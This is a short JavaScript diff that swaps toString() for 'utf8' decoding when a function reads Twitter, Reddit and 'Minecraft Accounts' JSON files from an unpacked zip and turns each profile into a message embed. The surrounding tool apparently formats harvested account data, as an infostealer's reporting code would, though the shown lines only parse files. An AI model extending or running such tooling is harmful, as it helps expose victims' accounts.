@@ -140,7 +140,7 @@ const json = async (zipFile) => {
   }
 
   if (fs.existsSync(join(getTempFolder(), 'Twitter.json'))) {
-    const profile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Twitter.json')).toString());
+    const profile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Twitter.json'), 'utf8'));
 
     embeds.push({
       author: {
@@ -170,7 +170,7 @@ const json = async (zipFile) => {
   }
 
   if (fs.existsSync(join(getTempFolder(), 'Reddit.json'))) {
-    const account = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Reddit.json')).toString());
+    const account = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Reddit.json'), 'utf8'));
 
     embeds.push({
       author: {
@@ -198,7 +198,7 @@ const json = async (zipFile) => {
   }
 
   if (fs.existsSync(join(getTempFolder(), 'Minecraft Accounts.json'))) {
-    const accounts = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Minecraft Accounts.json')).toString());
+    const accounts = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Minecraft Accounts.json'), 'utf8'));
 
     accounts.forEach(account => {
       embeds.push({
